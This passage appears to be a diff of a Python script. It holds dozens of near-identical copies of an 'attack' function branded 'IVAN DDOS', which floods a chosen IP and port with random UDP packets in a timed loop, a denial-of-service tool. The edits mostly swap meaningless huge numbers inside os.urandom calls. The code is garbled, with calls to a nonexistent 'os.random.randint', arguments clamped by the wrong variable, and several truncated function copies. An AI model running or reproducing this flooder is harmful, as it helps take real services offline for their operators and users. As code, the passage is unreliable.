+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -31579,7 +21709,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -31611,7 +21741,665 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+   
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+   
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+    
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+    
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -31987,7 +22775,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -32019,7 +22807,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -32051,7 +22839,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -32083,7 +22871,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -32115,7 +22903,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -32141,7 +22929,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -32173,7 +22961,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -32205,7 +22993,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -32237,7 +23025,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -32269,7 +23057,9219 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+   
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+   
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
